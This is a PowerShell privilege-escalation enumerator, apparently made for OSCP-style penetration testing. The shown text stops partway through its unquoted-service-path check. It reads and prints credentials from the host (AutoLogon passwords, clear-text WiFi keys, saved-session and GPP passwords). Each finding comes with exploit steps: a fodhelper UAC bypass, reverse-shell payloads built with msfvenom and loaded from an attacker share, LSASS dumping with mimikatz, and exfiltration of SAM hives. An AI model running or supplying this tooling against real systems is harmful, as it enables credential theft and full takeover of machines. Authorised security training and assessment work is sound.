#Requires -Version 2.0
<#
.SYNOPSIS
    Windows Privilege Escalation Enumerator - OSCP Edition
    Standalone. No internet. No external tools. No APIs.
    Enumerate only - shows exploit steps but does NOT execute them.

.NOTES
    Author : Nullpath Security
    Version: 3.0
    Run    : powershell -ep bypass -f WinPrivEsc-Checker.ps1
             powershell -ep bypass -f WinPrivEsc-Checker.ps1 -Extended
#>

param([switch]$Extended)

$ErrorActionPreference = 'SilentlyContinue'

#region ===== OUTPUT HELPERS =====
$script:Total = 0; $script:Actionable = 0; $script:Lateral = 0
$script:SeenBins = @{} # dedup writable binaries

function hdr($t) {
    Write-Host "`n  $([string]::new('=', 60))" -ForegroundColor Cyan
    Write-Host "  $t" -ForegroundColor Cyan
    Write-Host "  $([string]::new('=', 60))" -ForegroundColor Cyan
}

function hit($title, $detail, $exploit) {
    $script:Total++; $script:Actionable++
    Write-Host "  + " -ForegroundColor Green -NoNewline
    Write-Host $title -ForegroundColor White
    if ($detail) { $detail -split "`n" | %{ Write-Host "    $_" -ForegroundColor Gray } }
    if ($exploit) {
        $exploit -split "`n" | %{ Write-Host "    $_" -ForegroundColor Green }
    }
}

function lateral($title, $detail, $exploit) {
    $script:Total++; $script:Lateral++
    Write-Host "  > " -ForegroundColor Yellow -NoNewline
    Write-Host "$title  (LATERAL)" -ForegroundColor Yellow
    if ($detail) { $detail -split "`n" | %{ Write-Host "    $_" -ForegroundColor Gray } }
    if ($exploit) {
        $exploit -split "`n" | %{ Write-Host "    $_" -ForegroundColor Green }
    }
}

function bg($text) {
    $script:Total++
    Write-Host "  - $text" -ForegroundColor DarkGray
}

function warn($text) {
    $script:Total++; $script:Actionable++
    Write-Host "  ! " -ForegroundColor Yellow -NoNewline
    Write-Host $text -ForegroundColor White
}

function info($t) { }
function sub($t) { }

function finding($sev, $title, $detail, $exploit) {
    switch ($sev) {
        'CRIT' { hit $title $detail $exploit }
        'HIGH' { hit $title $detail $exploit }
        'MED'  { warn "$title$(if($detail){" | $detail"})" }
        'LOW'  { bg $title }
        default{ bg $title }
    }
}

function finding-writable-bin($type, $name, $bin, $runsAs, $extra, $exploit) {
    if ($bin -match '^C:\\Windows\\') { return }
    if ($script:SeenBins[$bin]) {
        Write-Host "    also: $type $name" -ForegroundColor DarkGray
        return
    }
    $script:SeenBins[$bin] = $true
    $isOtherUser = ($runsAs -and $runsAs -ne $myName -and $runsAs -match 'SYSTEM|LocalSystem|Administrator|NetworkService|LocalService')
    $label = if ($runsAs -match 'SYSTEM|LocalSystem') { '-> SYSTEM' }
             elseif ($runsAs -eq $myName) { '-> yourself (useless)'; return }
             else { "-> $runsAs" }

    # Filter Defender tamper-protected binaries
    if ($bin -match 'Windows Defender') {
        try {
            $tp = (Get-MpComputerStatus -ErrorAction Stop).IsTamperProtected
            if ($tp) {
                bg "Writable $type binary: $name (tamper-protected, skipped)"
                return
            }
        } catch {}
    }

    hit "Writable $type binary: $name $label" `
        "Binary: $bin$(if($extra){"`n$extra"})" `
        $exploit
}

#endregion

#region ===== WRITABLE CHECKS =====

function Test-Writable($path) {
    if (-not (Test-Path $path)) { return $false }
    try {
        $acl = Get-Acl $path -ErrorAction Stop
        $me = [Security.Principal.WindowsIdentity]::GetCurrent()
        $myIds = @($me.Name)
        $me.Groups | %{ try { $myIds += $_.Translate([Security.Principal.NTAccount]).Value } catch {} }
        $weak = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users','BUILTIN\Power Users')
        foreach ($r in $acl.Access) {
            if ($r.AccessControlType -ne 'Allow') { continue }
            $w = $r.FileSystemRights -band ([Security.AccessControl.FileSystemRights]::Write -bor
                [Security.AccessControl.FileSystemRights]::Modify -bor
                [Security.AccessControl.FileSystemRights]::FullControl -bor
                [Security.AccessControl.FileSystemRights]::ChangePermissions -bor
                [Security.AccessControl.FileSystemRights]::TakeOwnership -bor
                [Security.AccessControl.FileSystemRights]::AppendData)
            if (-not $w) { continue }
            $id = $r.IdentityReference.Value
            if ($id -in $weak -or $id -in $myIds) { return $true }
        }
    } catch {}
    return $false
}

function Test-WritableDir($path) {
    if (-not (Test-Path $path)) { return $false }
    try {
        $f = Join-Path $path ([IO.Path]::GetRandomFileName())
        [IO.File]::Create($f).Close(); Remove-Item $f -Force; return $true
    } catch { return $false }
}

function Test-RegWritable($regPath) {
    try {
        $acl = Get-Acl $regPath -ErrorAction Stop
        $me = [Security.Principal.WindowsIdentity]::GetCurrent()
        $myIds = @($me.Name)
        $me.Groups | %{ try { $myIds += $_.Translate([Security.Principal.NTAccount]).Value } catch {} }
        $weak = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users')
        foreach ($r in $acl.Access) {
            if ($r.AccessControlType -ne 'Allow') { continue }
            $w = $r.RegistryRights -band ([Security.AccessControl.RegistryRights]::SetValue -bor
                [Security.AccessControl.RegistryRights]::FullControl -bor
                [Security.AccessControl.RegistryRights]::WriteKey)
            if (-not $w) { continue }
            $id = $r.IdentityReference.Value
            if ($id -in $weak -or $id -in $myIds) { return $true }
        }
    } catch {}
    return $false
}

function Get-BinFromPath($raw) {
    if (-not $raw) { return $null }
    $p = $raw.Trim()
    if ($p.StartsWith('"')) {
        $end = $p.IndexOf('"', 1)
        if ($end -gt 0) { return $p.Substring(1, $end - 1) }
    }
    if ($p -match '^(.+?\.exe)') { return $Matches[1] }
    return ($p -split '\s')[0]
}

#endregion

# ╔══════════════════════════════════════════════════════════════╗
# ║                    START ENUMERATION                        ║
# ╚══════════════════════════════════════════════════════════════╝

$me     = [Security.Principal.WindowsIdentity]::GetCurrent()
$princ  = New-Object Security.Principal.WindowsPrincipal($me)
$isAdm  = $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$myName = $me.Name

# ════════════════════════════════════════════════════════════════
#  §0  ORIENTATION
# ════════════════════════════════════════════════════════════════

hdr "§0 - ORIENTATION"

$os = Get-CimInstance Win32_OperatingSystem 2>$null
$cs = Get-CimInstance Win32_ComputerSystem 2>$null
Write-Host "  OS       : $($os.Caption) $($os.Version) ($env:PROCESSOR_ARCHITECTURE)" -ForegroundColor Gray
Write-Host "  Build    : $($os.BuildNumber)" -ForegroundColor Gray
Write-Host "  Hostname : $($cs.Name)" -ForegroundColor Gray
Write-Host "  Domain   : $($cs.Domain) $(if($cs.PartOfDomain){'(DOMAIN-JOINED)'}else{'(WORKGROUP)'})" -ForegroundColor $(if($cs.PartOfDomain){'Yellow'}else{'Gray'})
Write-Host "  User     : $myName" -ForegroundColor Gray
Write-Host "  IsAdmin  : $isAdm" -ForegroundColor $(if($isAdm){'Green'}else{'Yellow'})

$integ = 'Unknown'
whoami /groups 2>$null | %{
    if ($_ -match 'High Mandatory')   { $integ = 'High (elevated)' }
    if ($_ -match 'Medium Mandatory') { $integ = 'Medium' }
    if ($_ -match 'Low Mandatory')    { $integ = 'Low' }
    if ($_ -match 'System Mandatory') { $integ = 'System' }
}
Write-Host "  Integrity: $integ" -ForegroundColor $(if($integ -match 'High|System'){'Green'}elseif($integ -eq 'Medium'){'Yellow'}else{'Red'})

sub "Local administrators"
net localgroup administrators 2>$null | %{ Write-Host "    $_" -ForegroundColor Gray }

sub "Interesting group memberships"
$groupHints = @{
    'BUILTIN\Administrators'       = 'CRIT|Full admin - UAC bypass needed if Medium integrity'
    'Backup Operators'             = 'HIGH|SeBackupPrivilege + SeRestorePrivilege - read/write any file'
    'Server Operators'             = 'HIGH|Can modify services - change service binaries for SYSTEM exec'
    'DnsAdmins'                    = 'HIGH|DLL injection into dns.exe (runs as SYSTEM)'
    'Print Operators'              = 'HIGH|SeLoadDriverPrivilege - load vulnerable kernel drivers'
    'Hyper-V Administrators'       = 'HIGH|Clone DC VHD, mount, extract NTDS.dit'
    'Account Operators'            = 'HIGH|Can modify non-protected accounts and groups'
    'Remote Desktop Users'         = 'MED|RDP access to this machine'
    'Remote Management Users'      = 'MED|WinRM/PSRemoting access'
    'Event Log Readers'            = 'MED|May find cleartext creds in event logs (4688, script block logging)'
    'Distributed COM Users'        = 'LOW|DCOM lateral movement potential'
}

$myGroups = @()
whoami /groups /fo csv 2>$null | ConvertFrom-Csv | %{
    $g = $_.'Group Name'
    $myGroups += $g
    foreach ($hint in $groupHints.Keys) {
        if ($g -match [regex]::Escape($hint)) {
            $parts = $groupHints[$hint] -split '\|',2
            finding $parts[0] "Member of: $g" $parts[1] `
                $(switch -Wildcard ($hint) {
                    '*Administrators*'   { "1. fodhelper.exe UAC bypass:`n   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d cmd.exe /f`n   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f`n   fodhelper.exe`n2. Or: eventvwr.exe / computerdefaults.exe same technique" }
                    '*Backup*'           { "reg save HKLM\SAM sam.bak`nreg save HKLM\SYSTEM sys.bak`nsecretsdump.py -sam sam.bak -system sys.bak LOCAL" }
                    '*DnsAdmins*'        { "1. msfvenom -p windows/x64/shell_reverse_tcp ... -f dll > evil.dll`n2. dnscmd /config /serverlevelplugindll \\attacker\evil.dll`n3. sc stop dns & sc start dns" }
                    '*Server Operators*' { 'sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add"' + "`nsc stop <svc> & sc start <svc>" }
                    default { $null }
                })
        }
    }
}

# ════════════════════════════════════════════════════════════════
#  §0.5  TOKEN PRIVILEGES
# ════════════════════════════════════════════════════════════════

hdr "§0.5 - TOKEN PRIVILEGES (whoami /priv)"

$dangerousPrivs = @{
    'SeImpersonatePrivilege'        = @{ S='CRIT'; D='Potato attacks -> SYSTEM'
        E="PrintSpoofer.exe -i -c cmd`nGodPotato.exe -cmd `"cmd /c whoami`"`nJuicyPotato.exe -l 1337 -p cmd.exe -t *`nSweetPotato.exe -e EfsRpc -p cmd.exe" }
    'SeAssignPrimaryTokenPrivilege' = @{ S='CRIT'; D='Token assignment - same as SeImpersonate'
        E="JuicyPotato.exe -l 1337 -p cmd.exe -t *`nGodPotato.exe -cmd `"cmd /c whoami`"" }
    'SeDebugPrivilege'              = @{ S='CRIT'; D='Debug any process - dump LSASS for creds'
        E="procdump.exe -accepteula -ma lsass.exe lsass.dmp`nThen on attacker: mimikatz # sekurlsa::minidump lsass.dmp`nmimikatz # sekurlsa::logonpasswords" }
    'SeBackupPrivilege'             = @{ S='HIGH'; D='Read any file regardless of ACL'
        E="reg save HKLM\SAM sam.bak`nreg save HKLM\SYSTEM sys.bak`nsecretsdump.py -sam sam.bak -system sys.bak LOCAL`nOr: robocopy /b to copy any file" }
    'SeRestorePrivilege'            = @{ S='HIGH'; D='Write any file - overwrite system binaries'
        E="Replace utilman.exe with cmd.exe:`ncopy cmd.exe C:\Windows\System32\utilman.exe`nLock screen -> click Ease of Access -> SYSTEM shell" }
    'SeTakeOwnershipPrivilege'      = @{ S='HIGH'; D='Take ownership of any object'
        E="takeown /f C:\Windows\System32\config\SAM`nicacls C:\Windows\System32\config\SAM /grant $($myName):F`nThen dump SAM hashes" }
    'SeLoadDriverPrivilege'         = @{ S='HIGH'; D='Load kernel drivers - Capcom.sys exploit'
        E="1. Load vulnerable Capcom.sys driver`n2. ExploitCapcom.exe to get SYSTEM shell" }
    'SeCreateTokenPrivilege'        = @{ S='HIGH'; D='Create arbitrary tokens with any privilege'
        E="Craft token with admin privileges using NtCreateToken" }
    'SeTcbPrivilege'                = @{ S='CRIT'; D='Act as OS - create tokens for any user'
        E="Create token for any user including SYSTEM" }
    'SeManageVolumePrivilege'       = @{ S='HIGH'; D='Manage volumes - write to system32'
        E="SeManageVolumeExploit.exe`nThen place DLL in system32 for hijack" }
}

$privLines = whoami /priv 2>$null
if ($privLines) {
    foreach ($line in $privLines) {
        if ($line -match '^\s*(Se\w+Privilege)\s+.*?(Enabled|Disabled)') {
            $pn = $Matches[1]; $ps = $Matches[2]
            if ($dangerousPrivs.ContainsKey($pn)) {
                $p = $dangerousPrivs[$pn]
                $sev = if ($ps -eq 'Enabled') { $p.S } else { 'LOW' }
                finding $sev "$pn - $ps" $p.D $p.E
            }
        }
    }
}

# ════════════════════════════════════════════════════════════════
#  §1  FREE CREDENTIAL WINS
# ════════════════════════════════════════════════════════════════

hdr "§1 - FREE CREDENTIAL WINS"

sub "Stored credentials (cmdkey /list)"
$ck = cmdkey /list 2>$null | Out-String
if ($ck -match 'Target:') {
    finding 'HIGH' 'Stored credentials found' $ck.Trim() `
        "runas /savecred /user:<domain\user> cmd.exe`nrunas /savecred /user:<user> `"powershell -ep bypass -f shell.ps1`""
} else { info "No stored credentials." }

sub "AutoLogon registry"
try {
    $wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction Stop
    if ($wl.DefaultPassword) {
        finding 'CRIT' "AutoLogon password in registry!" `
            "User: $($wl.DefaultUserName)`nDomain: $($wl.DefaultDomainName)`nPassword: $($wl.DefaultPassword)" `
            "Use these credentials to log in!"
    } elseif ($wl.AutoAdminLogon -eq '1') {
        finding 'MED' "AutoAdminLogon enabled (password may be in LSA secrets)" `
            "User: $($wl.DefaultUserName)"
    } else { info "No AutoLogon credentials." }
} catch { info "Cannot read Winlogon key." }

sub "Local user descriptions (often contain passwords)"
Get-LocalUser 2>$null | Where-Object { $_.Description -and $_.Description.Length -gt 1 } | ForEach-Object {
    $desc = $_.Description
    $sev = if ($desc -match '(?i)(pass|pwd|wachtwoord|cred|secret|key|login)') { 'HIGH' } else { 'INFO' }
    finding $sev "User: $($_.Name) - Description: $desc" `
        "Enabled: $($_.Enabled)" `
        $(if($sev -eq 'HIGH'){'Description may contain a password - try it!'})
}

# --- NEW: windows.old SAM/SYSTEM ---
sub "windows.old SAM/SYSTEM backups"
$winOldPaths = @(
    'C:\windows.old\Windows\System32\SAM',
    'C:\windows.old\Windows\System32\SYSTEM',
    'C:\windows.old\Windows\System32\config\SAM',
    'C:\windows.old\Windows\System32\config\SYSTEM',
    'C:\windows.old\Windows\System32\config\SECURITY'
)
$foundWinOld = @()
foreach ($f in $winOldPaths) {
    if (Test-Path $f) {
        $readable = $false
        try { $s = [IO.File]::OpenRead($f); $s.Close(); $readable = $true } catch {}
        if ($readable) { $foundWinOld += $f }
    }
}
if ($foundWinOld.Count -ge 2) {
    $samFile = $foundWinOld | Where-Object { $_ -match 'SAM$' } | Select-Object -First 1
    $sysFile = $foundWinOld | Where-Object { $_ -match 'SYSTEM$' } | Select-Object -First 1
    if ($samFile -and $sysFile) {
        finding 'CRIT' "windows.old SAM + SYSTEM readable!" `
            "SAM: $samFile`nSYSTEM: $sysFile" `
            "download SAM`ndownload SYSTEM`nsecretsdump.py -sam SAM -system SYSTEM LOCAL"
    }
} elseif ($foundWinOld.Count -gt 0) {
    foreach ($f in $foundWinOld) {
        finding 'HIGH' "windows.old backup readable: $f" $null `
            "download `"$f`""
    }
}

sub "PowerShell history (all users)"
$userDirs = Get-ChildItem 'C:\Users' -Directory -Force 2>$null
foreach ($ud in $userDirs) {
    $hist = Join-Path $ud.FullName 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
    if (Test-Path $hist) {
        $size = (Get-Item $hist).Length
        $content = Get-Content $hist -TotalCount 50 2>$null | Out-String
        $hasCreds = $content -match '(?i)(password|passwd|cred|secret|token|key|runas|net use|psexec|invoke-command)'
        $sev = if ($hasCreds) { 'HIGH' } else { 'MED' }
        $sizeKB = [math]::Round($size/1KB,1)
        $histDetail = if ($hasCreds) { 'Contains potential credential keywords!' } else { $null }
        finding $sev "PS history: $hist ($sizeKB KB)" `
            $histDetail `
            "type ""$hist""`ntype ""$hist"" | findstr /i ""password passwd cred secret token runas net"""
    }
}

sub "PuTTY saved sessions"
$puttyKeys = Get-ChildItem 'HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions' 2>$null
if ($puttyKeys) {
    foreach ($k in $puttyKeys) {
        $props = Get-ItemProperty $k.PSPath
        finding 'HIGH' "PuTTY session: $($k.PSChildName)" `
            "Host: $($props.HostName)`nUser: $($props.UserName)`nProxy: $($props.ProxyUsername):$($props.ProxyPassword)" `
            "reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions\$($k.PSChildName)"
    }
} else { info "No PuTTY sessions." }

sub "WinSCP saved sessions"
$winscp = Get-ChildItem 'HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions' 2>$null
if ($winscp) {
    foreach ($k in $winscp) {
        $props = Get-ItemProperty $k.PSPath
        finding 'HIGH' "WinSCP session: $($k.PSChildName)" `
            "Host: $($props.HostName)`nUser: $($props.UserName)" `
            "Decrypt with winscppasswd.exe or SharpWinSCP"
    }
}

sub "mRemoteNG config"
$mremote = "$env:APPDATA\mRemoteNG\confCons.xml"
if (Test-Path $mremote) {
    finding 'HIGH' "mRemoteNG config found" "Path: $mremote" `
        "Passwords AES-GCM encrypted, default key = mR3m`nmRemoteNG-Decrypt.py to extract"
}

sub "FileZilla saved credentials"
@("$env:APPDATA\FileZilla\recentservers.xml", "$env:APPDATA\FileZilla\sitemanager.xml") | %{
    if (Test-Path $_) {
        finding 'HIGH' "FileZilla creds: $_" "Passwords stored plaintext or base64 in XML" `
            "type `"$_`" | findstr /i `"Pass Host User`""
    }
}

sub "WiFi passwords"
$profiles = netsh wlan show profiles 2>$null
if ($profiles -match 'All User Profile') {
    $profileNames = ($profiles | Select-String 'All User Profile\s*:\s*(.+)' | %{ $_.Matches.Groups[1].Value.Trim() })
    foreach ($p in $profileNames) {
        $keyContent = netsh wlan show profile name="$p" key=clear 2>$null
        $key = ($keyContent | Select-String 'Key Content\s*:\s*(.+)' | %{ $_.Matches.Groups[1].Value.Trim() })
        if ($key) { finding 'MED' "WiFi: $p - Key: $key" }
    }
}

sub "DPAPI credential blobs"
$dpapiPath = "$env:APPDATA\Microsoft\Credentials"
if (Test-Path $dpapiPath) {
    $blobs = Get-ChildItem $dpapiPath -Force 2>$null
    if ($blobs.Count -gt 0) {
        finding 'MED' "DPAPI credential blobs: $($blobs.Count) files" "Path: $dpapiPath" `
            "mimikatz: dpapi::cred /in:<file>`nOr: SharpDPAPI.exe credentials"
    }
}

sub "Browser data (common paths)"
$browserPaths = @{
    'Chrome Login Data'  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    'Chrome Cookies'     = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
    'Edge Login Data'    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    'Firefox profiles'   = "$env:APPDATA\Mozilla\Firefox\Profiles"
}
foreach ($bp in $browserPaths.Keys) {
    if (Test-Path $browserPaths[$bp]) {
        finding 'MED' "Browser data: $bp" "Path: $($browserPaths[$bp])" `
            "SharpChromium.exe or LaZagne.exe browsers"
    }
}

# ════════════════════════════════════════════════════════════════
#  §2  FILE SEARCH FOR PASSWORDS
# ════════════════════════════════════════════════════════════════

hdr "§2 - FILE SEARCH FOR PASSWORDS"

sub "Unattend and sysprep files"
$sensitiveFiles = @(
    'C:\unattend.xml','C:\unattend.txt',
    'C:\Windows\Panther\unattend.xml','C:\Windows\Panther\Unattended.xml',
    'C:\Windows\Panther\Unattend\unattend.xml',
    'C:\Windows\system32\sysprep\unattend.xml',
    'C:\Windows\system32\sysprep\sysprep.xml',
    'C:\Windows\system32\sysprep\Panther\unattend.xml'
)
foreach ($f in $sensitiveFiles) {
    if (Test-Path $f) {
        finding 'HIGH' "FOUND: $f" "May contain plaintext or base64-encoded credentials" `
            "type `"$f`" | findstr /i `"password cpassword username`""
    }
}

sub "SAM / SYSTEM backup copies"
$samFiles = @(
    'C:\Windows\repair\SAM','C:\Windows\repair\SYSTEM',
    'C:\Windows\System32\config\RegBack\SAM','C:\Windows\System32\config\RegBack\SYSTEM',
    'C:\Windows\System32\config\RegBack\SECURITY'
)
foreach ($f in $samFiles) {
    if (Test-Path $f) {
        $readable = $false
        try { $s = [IO.File]::OpenRead($f); $s.Close(); $readable = $true } catch {}
        if ($readable) {
            finding 'CRIT' "Readable SAM/SYSTEM backup: $f" $null `
                "copy `"$f`" \\attacker\share\`nsecretsdump.py -sam SAM -system SYSTEM LOCAL"
        } else {
            finding 'LOW' "SAM/SYSTEM backup exists but not readable: $f"
        }
    }
}

# --- NEW: Volume Shadow Copies ---
sub "Volume Shadow Copies (VSS)"
$vss = vssadmin list shadows 2>$null | Out-String
if ($vss -match 'Shadow Copy Volume|Shadow Copy ID') {
    $copies = ([regex]::Matches($vss, 'Shadow Copy Volume: (\\\\\?\\GLOBALROOT\\Device\\[^\s]+)') | %{ $_.Groups[1].Value })
    if ($copies.Count -gt 0) {
        finding 'HIGH' "Shadow copies exist ($($copies.Count) found) - may contain old SAM/SYSTEM" `
            "First shadow: $($copies[0])" `
            "copy $($copies[0])\Windows\System32\config\SAM .`ncopy $($copies[0])\Windows\System32\config\SYSTEM .`nsecretsdump.py -sam SAM -system SYSTEM LOCAL"
    } else {
        finding 'HIGH' "Shadow copies exist - enumerate manually" $null `
            "vssadmin list shadows`ncopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM ."
    }
}

sub "KeePass databases (known locations)"
@("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads",
  'C:\Users\Public\Documents','C:\Temp','C:\Backups') | %{
    if (Test-Path $_) {
        Get-ChildItem $_ -Include '*.kdbx' -Force -ErrorAction SilentlyContinue | Select-Object -First 3 | %{
            finding 'HIGH' "KeePass DB: $($_.FullName)" "Size: $($_.Length) bytes" `
                "keepass2john `"$($_.FullName)`" > hash.txt`nhashcat -m 13400 hash.txt rockyou.txt"
        }
    }
}

sub "RDP files and private keys (known locations)"
@("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads",
  "$env:USERPROFILE\.ssh") | %{
    if (Test-Path $_) {
        Get-ChildItem $_ -Include '*.rdp','*.ppk','*.pem','*.key','*.pfx','*.p12','*.id_rsa' -Force -ErrorAction SilentlyContinue | Select-Object -First 5 | %{
            $ext = $_.Extension
            if ($ext -eq '.rdp') {
                finding 'MED' "RDP file: $($_.FullName)" $null `
                    "type `"$($_.FullName)`" | findstr /i `"password username full`""
            } else {
                finding 'HIGH' "Private key: $($_.FullName)" "Size: $($_.Length) bytes" `
                    "Copy to attacker, crack passphrase if needed: john --wordlist=rockyou.txt <key>"
            }
        }
    }
}

sub "IIS and web config files"
$webConfigs = @(
    'C:\inetpub\wwwroot\web.config','C:\inetpub\wwwroot\appsettings.json',
    'C:\xampp\htdocs\config.php','C:\xampp\phpMyAdmin\config.inc.php',
    'C:\wamp\www\config.php'
)
foreach ($f in $webConfigs) {
    if (Test-Path $f) {
        finding 'HIGH' "Web config: $f" $null `
            "type `"$f`" | findstr /i `"password connectionstring secret apikey`""
    }
}

sub "GPP cpassword (fixed paths)"
$gppFixed = @(
    "$env:ALLUSERSPROFILE\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml",
    "$env:ALLUSERSPROFILE\Microsoft\Group Policy\History\*\Machine\Preferences\Services\Services.xml"
)
foreach ($pattern in $gppFixed) {
    Get-Item $pattern -Force -ErrorAction SilentlyContinue | %{
        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        if ($content -match 'cpassword') {
            finding 'CRIT' "GPP cpassword found: $($_.FullName)" `
                "Contains encrypted password - trivially decryptable (AES key is public)" `
                "gpp-decrypt <cpassword_value>"
        }
    }
}

# --- NEW: SYSVOL GPP via domain share ---
if ($cs.PartOfDomain) {
    sub "GPP cpassword (SYSVOL share)"
    $gppFiles = @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
    try {
        Get-ChildItem "\\$($cs.Domain)\SYSVOL\" -Recurse -Include $gppFiles -Force -ErrorAction Stop | ForEach-Object {
            $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            if ($c -match 'cpassword="([^"]+)"') {
                finding 'CRIT' "GPP cpassword in SYSVOL: $($_.FullName)" `
                    "cpassword value found" `
                    "gpp-decrypt $($Matches[1])"
            }
        }
    } catch {}
}

if ($Extended) {
    sub "Extended file password search (slow)"
    $searchDirs = @('C:\Users','C:\inetpub','C:\xampp','C:\Temp','C:\Scripts','C:\Backups','C:\Shares','C:\ProgramData')
    $searchExt  = @('*.xml','*.ini','*.txt','*.config','*.cfg','*.log','*.bat','*.cmd','*.ps1','*.vbs','*.py','*.php','*.asp','*.aspx')
    foreach ($sd in $searchDirs) {
        if (-not (Test-Path $sd)) { continue }
        Get-ChildItem $sd -Recurse -Include $searchExt -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 -and $_.Length -lt 500KB } |
            Select-Object -First 50 | %{
            $content = Get-Content $_.FullName -TotalCount 100 -ErrorAction SilentlyContinue | Out-String
            if ($content -match '(?i)(password\s*[=:]\s*\S|passwd\s*[=:]\s*\S|pwd\s*[=:]\s*\S|connectionstring.*password|secret\s*[=:]\s*\S)') {
                finding 'HIGH' "Password keyword in: $($_.FullName)" $null "type `"$($_.FullName)`""
            }
        }
    }
}

# ════════════════════════════════════════════════════════════════
#  §3  UAC CONFIGURATION
# ════════════════════════════════════════════════════════════════

hdr "§3 - UAC CONFIGURATION"

try {
    $uac = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction Stop
    Write-Host "  EnableLUA                    : $($uac.EnableLUA)" -ForegroundColor $(if($uac.EnableLUA -eq 0){'Red'}else{'Gray'})
    Write-Host "  ConsentPromptBehaviorAdmin   : $($uac.ConsentPromptBehaviorAdmin)" -ForegroundColor $(if($uac.ConsentPromptBehaviorAdmin -eq 0){'Red'}else{'Gray'})
    Write-Host "  FilterAdministratorToken     : $($uac.FilterAdministratorToken)" -ForegroundColor Gray
    Write-Host "  LocalAccountTokenFilterPolicy: $($uac.LocalAccountTokenFilterPolicy)" -ForegroundColor $(if($uac.LocalAccountTokenFilterPolicy -eq 1){'Yellow'}else{'Gray'})

    if ($uac.EnableLUA -eq 0) {
        finding 'CRIT' 'UAC is DISABLED' 'All admin tokens are unrestricted - no elevation needed.' `
            "If you are in Administrators group: you already have full admin."
    }
    if ($uac.ConsentPromptBehaviorAdmin -eq 0 -and $uac.EnableLUA -ne 0) {
        finding 'HIGH' 'UAC auto-elevates admins (no prompt)' $null `
            "fodhelper.exe bypass:`nreg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d `"cmd.exe`" /f`nreg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f`nfodhelper.exe"
    }
    if ($uac.LocalAccountTokenFilterPolicy -eq 1) {
        finding 'MED' 'LocalAccountTokenFilterPolicy = 1' 'Local admin accounts get full token remotely (PTH works).' `
            "crackmapexec smb <target> -u <admin> -H <hash>"
    }
} catch { info "Cannot read UAC keys." }

sub "AlwaysInstallElevated"
$aieHKLM = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aieHKCU = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($aieHKLM -eq 1 -and $aieHKCU -eq 1) {
    finding 'CRIT' 'AlwaysInstallElevated ENABLED (both HKLM + HKCU)' `
        'Any user can install MSI as SYSTEM.' `
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi`nmsiexec /quiet /qn /i shell.msi"
} else {
    info "AlwaysInstallElevated not set (HKLM=$aieHKLM, HKCU=$aieHKCU)."
}

# --- NEW: WSUS over HTTP ---
sub "WSUS configuration"
$wsusServer = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' -ErrorAction SilentlyContinue).WUServer
if ($wsusServer -and $wsusServer -match '^http://') {
    finding 'CRIT' "WSUS over HTTP: $wsusServer" `
        "MITM the HTTP WSUS connection to inject malicious updates" `
        "SharpWSUS.exe or PyWSUS to inject fake update`nRequires ARP spoofing or network position"
} elseif ($wsusServer) {
    bg "WSUS configured (HTTPS): $wsusServer"
}

# ════════════════════════════════════════════════════════════════
#  §4  SERVICE MISCONFIGURATIONS
# ════════════════════════════════════════════════════════════════

hdr "§4 - SERVICE MISCONFIGURATIONS"

$allServices = Get-CimInstance Win32_Service 2>$null

sub "Services running as non-default accounts"
$svcAccounts = $allServices | Group-Object StartName | Sort-Object Count -Descending
foreach ($grp in $svcAccounts) {
    $acct = $grp.Name
    if ($acct -match 'LocalSystem|LocalService|NetworkService|^$') { continue }
    finding 'INFO' "Account: $acct - runs $($grp.Count) service(s)" `
        ($grp.Group | Select-Object -First 5 | %{ "  $($_.Name): $($_.PathName)" } | Out-String).Trim()
}

sub "Unquoted service paths"
$unquotedCount = 0
$allServices | Where-Object {
    $_.PathName -and
    $_.PathName -notmatch '^"' -and
    $_.PathName -notmatch '^\\\\' -and
    $_.PathName -match '\s' -and
    $_.PathName -notmatch '^C:\\Windows\\system32\\'
} | ForEach-Object {
    $svc = $_; $unquotedCount++
    $writableDirs = @()
    $pathParts = ($svc.PathName -replace '\s+-.*$','') -split '\\'
    $checkPath = ''
    for ($i = 0; $i -lt $pathParts.Count - 1; $i++) {
        $checkPath = if ($checkPath) { "$checkPath\$($pathParts[$i])" } else { $pathParts[$i] }
        if ($checkPath.Length -le 3) { continue }
        if (Test-WritableDir $checkPath) { $writableDirs += $checkPath }
    }
    $sev = if ($writableDirs.Count -gt 0) { 'HIGH' } else { 'MED' }
